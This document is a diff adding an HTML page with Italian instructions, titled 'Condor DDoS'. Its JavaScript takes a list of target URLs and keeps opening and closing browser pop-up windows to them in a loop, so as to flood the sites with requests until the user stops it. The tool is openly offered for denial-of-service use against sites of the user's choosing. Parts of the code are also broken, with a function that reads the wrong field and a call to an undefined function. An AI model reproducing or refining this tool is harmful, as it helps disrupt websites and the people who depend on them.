@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+	<title>DDoS</title>
+
+	<style>
+	  body {}
+	  h1,p {color: rgba(0, 0, 0, 0.568);}
+
+		#container {
+			width: 500px;
+			margin: auto;
+			top: 0;
+		}
+
+		#topbackground {
+	    position: fixed;
+	    top: 0;
+	    left: 0;
+	    height: 100%;
+			width:100%;
+	    background-color: rgb(99, 99, 99);
+		}
+
+	</style>
+</head>
+
+<body>
+	<div id="topbackground">
+		<center><h1>Condor DDoS</h1></center>
+		<div id="container">
+			<center><h3>Per favore consenti i POP-UP.</h3></center>
+			<p>Inserisci nell'html i link dei siti nella voce: data ='{"url":["https://esempio1.it"]}'' come nel esempio</p>
+			<p><input id="windowcount" type="number" min="1" max="25" onblur="getWindowCount()" value="5" title="1 to 25"> quanti link hai inserito?</p>
+			<p><input id="windowlive" type="number" min="1" max="25" onblur="getWindowLive()" value="10" title="1 to 30"> refresha richieste ogni quanti secondi?</p>
+			<button onclick="openURLs(); return false;">Inizia</button><br>
+			<button onclick="killAll(); return false;">Ferma</button> <br>
+		</div>
+	</div>
+	<div id="background">&nbsp;</div>
+</body>
+
+<script type="text/javascript">
+
+data ='{"url":["https://esempio1.it","https://esempio2.it"]}'
+
+const dataobj = JSON.parse(data);
+var numWindows = 5;
+var dataIndex = 0;
+var windowlivesec = 10000;
+var dataLength = dataobj.url.length;
+
+$( '#theCount' ).html(dataLength);
+
+function getWindowCount() {
+	numWindows = $( "#windowcount" ).val();
+}
+
+function getWindowLive(){
+	 windowlivesec = $( "#windowcount" ).val() * 1000;
+}
+window.value = 1;
+function closeOnLoad(myLink)
+{
+  var newWindow = window.open(myLink);
+  setTimeout(
+             function()
+             {
+				 if(window.value==1){
+               		newWindow.close();
+					openAnother();
+				 }
+             },
+             windowlivesec
+            );
+};
+
+function openAnother(){
+	
+	dataIndex++;
+	if (dataIndex == dataLength) {
+		dataIndex = 0;
+	}
+	closeOnLoad(dataobj.url[dataIndex]);
+	
+}
+
+function openURLs(){
+	window.value = 1;
+	for (let i = 0; i < numWindows; i++) {
+	closeOnLoad(dataobj.url[i]);
+		dataIndex = i;
+	}
+	
+}
+
+function killAll(){
+	window.value = 2;
+	return window.value;
+};
+setGlobal();
+
+</script>
+
+</html>
